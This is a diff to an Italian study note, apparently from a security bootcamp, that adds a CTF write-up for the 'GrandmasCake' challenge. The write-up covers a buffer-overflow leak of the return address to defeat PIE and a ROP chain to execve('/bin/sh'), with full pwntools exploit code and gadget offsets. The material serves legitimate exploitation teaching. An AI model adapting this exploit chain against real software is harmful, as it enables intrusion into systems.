@@ -165,15 +165,66 @@ p.sendline(payload2)
 > ```
 > `gdb.debug` richiede il pacchetto **`gdbserver`** (`sudo dnf install gdb-gdbserver` su Fedora). Comandi utili dentro pwndbg: `canary` (valore del canary del processo), `stack 20` / `telescope $rsp 20` (stack con dereferencing automatico). La notazione `◂—` si legge "l'indirizzo a sinistra contiene il valore a destra". Il binario non strippato (`Stripped: No`) permette `break <nome_funzione>` senza calcolare indirizzi a mano.
 
+### GrandmasCake · Leak del return address per battere il PIE e ROP a `execve`
+
+Obiettivo: ottenere una shell con `execve("/bin/sh", NULL, NULL)` su un binario con **PIE** e **NX** attivi ma **senza canary**. Servono due cose in sequenza: (1) un **leak** per ricavare la base del PIE (vedi [[PIE]]), (2) una catena **ROP** (vedi [[ROP]]) che prepara i registri della syscall e la invoca. Il binario regala i gadget utili in una funzione `usefull` (prologo normale seguito da `pop rax; pop rdx; retn`, che la `sp-analysis failed` di IDA tradisce come "finta funzione"): enumerando `rop.gadgets` emergono `pop rax; pop rdx; ret`, `pop rdi; pop r13; pop rsi; ret` e un `syscall` isolato.
+
+**Fase 1 — leak via `printf("...%s...", buf)`.** La `granny()` vulnerabile legge in `char buf[16]` (a `rbp-0x10`) con `read(0, buf, 0x50)`: 80 byte in un buffer da 16, quindi *buffer overflow*. Poco dopo stampa `buf` con `%s`. Il punto chiave è che **`%s` stampa fino al primo `\x00`**: per leakare oltre il buffer non deve esserci un null byte lungo la strada. Riempiendo 24 byte non-nulli — `strawberry` (richiesto dal controllo sul flavor) + 6 di padding per completare `buf` + 8 che calpestano il `saved rbp` — si tolgono di mezzo gli `\x00` del saved rbp e `%s` prosegue fino al **return address**, che resta intatto.
+
+Quel return address è l'istruzione **successiva** alla `call granny` (`0x1372`, non `0x136D` della call stessa): `call` mette sullo stack l'indirizzo di ritorno = istruzione dopo. Inizia con `0x55…`, firma di un indirizzo di codice PIE. Da qui si ricava la base:
+
+```python
+p.recvuntil(b">")
+p.send(b"strawberry" + b"P"*6 + b"B"*8)   # 24 byte: riempie buf (16) + saved rbp (8)
+leak = p.recvuntil(b">")
+ret_leak = u64(leak[57:63].ljust(8, b"\x00"))   # 6 byte reali + 2 \x00 per arrivare a 8
+pie_base = ret_leak - 0x1372                      # offset del return address in IDA
+exe.address = pie_base                            # riallinea tutto il binario
+```
+
+Lo slice `[57:63]` isola i 6 byte dell'indirizzo: 33 (`"How lucky! I happen to have some "`) + 10 (`strawberry`) + 6 (`P`) + 8 (`B`) = 57.
+
+> [!warning] Correzione · il null byte **ferma** `%s`, non lo abilita
+> Il primo tentativo inviava `strawberry` + un null byte per "chiudere" la stringa: ma quel `\x00` è esattamente ciò che interrompe `%s`, e il leak restituiva solo `"strawberry"`. Per leggere saved rbp e return address serve l'**opposto**: nessun `\x00`, e padding non-nullo fin sopra i valori da leakare. Un indirizzo userspace Linux a 64 bit ha gli ultimi 2 byte a zero (`0x0000xxxxxxxxxxxx`), quindi `%s` ne restituisce solo i 6 byte bassi: si ricompone a 8 con `.ljust(8, b"\x00")` prima di `u64`.
+
+> [!warning] Correzione · si leaka la **base**, non "l'offset"
+> Equivoco ricorrente: chiamare `pie_base` "l'offset dovuto al PIE". Nella formula `indirizzo reale = base + offset` l'*offset* è la distanza **fissa** di un simbolo (letta in IDA: `0x1372`, `0x11f8`, …) e non cambia mai; la **base** è dove il binario viene caricato stavolta e cambia a ogni esecuzione. Per un PIE la base coincide numericamente con lo *scorrimento* ASLR (nel file gli indirizzi partono da 0), e questo spiega l'equivoco — ma `exe.address` si aspetta la **base**, da tenere distinta dagli offset dei simboli.
+
+**Fase 2 — ROP a `execve` (syscall 59).** Convenzione delle syscall Linux x86-64 (vedi [[Calling Convention]]): numero in `rax`, argomenti in `rdi, rsi, rdx, r10, r8, r9`. Per `execve(pathname, argv, envp)` servono `rax=59`, `rdi=&"/bin/sh"`, `rsi=0`, `rdx=0`. I gadget a disposizione impongono l'ordine: `pop rdi; pop r13; pop rsi; ret` **consuma tre valori** (rdi, poi r13, poi rsi), quindi vanno fornite tre celle. Il `syscall` non è speciale: in una catena ROP ogni cella è un indirizzo di ritorno, quindi lo si mette come una qualsiasi, in coda, a registri pronti (è `['syscall']` senza `ret`, ma va bene come ultima tappa: se `execve` riesce sostituisce il processo). La stringa `/bin/sh` è già nel binario, in `.data`: `exe.search(b"/bin/sh\x00")` la trova da sola (dopo `exe.address`, restituisce l'indirizzo reale).
+
+```python
+rop = ROP(exe)
+pop_rax_rdx     = pie_base + 0x11f1   # pop rax; pop rdx; ret
+pop_rdi_r13_rsi = pie_base + 0x11f8   # pop rdi; pop r13; pop rsi; ret
+syscall_gadget  = pie_base + 0x11fd   # syscall
+binsh = next(exe.search(b"/bin/sh\x00"))
+
+payload  = b"A"*16 + b"B"*8                                     # buf + saved rbp fino al ret
+payload += p64(pop_rax_rdx) + p64(59) + p64(0)                 # rax=59 (execve), rdx=0 (envp)
+payload += p64(pop_rdi_r13_rsi) + p64(binsh) + p64(0) + p64(0) # rdi=&/bin/sh, r13=junk, rsi=0
+payload += p64(syscall_gadget)
+
+p.sendline(payload)   # va alla seconda read(0x60); il flavor non è più ricontrollato
+p.interactive()
+```
+
+> [!warning] Correzione · `rdi` vuole un **puntatore**, non la stringa — e attenzione a *dove* dentro la stringa
+> Nel primo payload `rdi` riceveva i byte letterali `b"/bin/sh"`. Due errori in una riga: (1) un registro non "contiene" un file ma l'**indirizzo** dove la stringa sta in memoria → serve `p64(binsh)`; (2) `b"/bin/sh"` è lungo **7** byte, non 8, quindi sfasa l'intera catena da lì in poi (r13, rsi, syscall finirebbero disallineati). In più, in IDA il simbolo a `0x4010` è `'As per usual:/bin/sh\0'`: `"/bin/sh"` **non** inizia a `0x4010` ma dopo i 13 byte di `"As per usual:"`, cioè a `0x401D`. Puntare a `0x4010` chiederebbe a `execve` di eseguire un file chiamato `"As per usual:/bin/sh"`, inesistente. `exe.search(b"/bin/sh\x00")` restituisce direttamente `0x401D` (+ base), senza conteggi a mano.
+
+> [!note] Perché il ROP via `ret` funziona nonostante SHSTK/IBT
+> Il `checksec` segnala **IBT** e **SHSTK** abilitati. IBT (*Indirect Branch Tracking*) pretende un `endbr64` solo come bersaglio di `call`/`jmp` **indiretti**: il `ret` non è un salto indiretto, quindi la catena ROP non lo viola. SHSTK (*Shadow Stack*) invece rileverebbe la sovrascrittura del return address — se fosse davvero **imposto a runtime** da CPU + kernel + glibc. Un ROP classico che va a segno indica che lo shadow stack è marcato nel binario ma non attivo nell'ambiente di esecuzione.
+
 ## Ripasso
 
 - **Il programma scrive un prompt senza andare a capo. Come lo riconosci?** Con `recvuntil`, usando i byte che segnano la fine del prompt.
 - **Devi leggere un intero binario a 32 bit. Quali decisioni prendi?** Leggi quattro byte con `recvn(4)` e li interpreti con `u32` nell'ordine stabilito dal formato.
 - **Un messaggio contiene spazi finali significativi. Come li conservi?** Se il delimitatore è `b"\n"`, usa `recvuntil(b"\n", drop=True)`. Un generico `.strip()` eliminerebbe anche gli spazi.
+- **PIE attivo: come usi un leak di un return address per calcolare la base?** `base = indirizzo_leakato - offset_del_simbolo_in_IDA`, dove l'offset è quello dell'istruzione **dopo** la `call` (il return address). Poi `exe.address = base` e ogni gadget/stringa diventa `exe.search(...)` o `base + offset`.
+- **Hai trovato `/bin/sh` in `.data` ma dentro una stringa più lunga. Cosa passi a `rdi`?** L'**indirizzo** del sottostringa esatta `"/bin/sh"` (`p64(binsh)`), non i suoi byte né l'inizio del simbolo che la contiene. `exe.search(b"/bin/sh\x00")` individua l'offset giusto da solo.
 
 ## Collegamenti
 
-- **Concetti correlati**: [[Buffer Overflow dello Stack]] · [[Shellcode]] · [[ROP]]
+- **Concetti correlati**: [[Buffer Overflow dello Stack]] · [[Shellcode]] · [[ROP]] · [[PIE]] · [[Calling Convention]]
 - **Mappa**: [[MOC - CyberBootCamp]]
 
 > [!info] Approfondimento
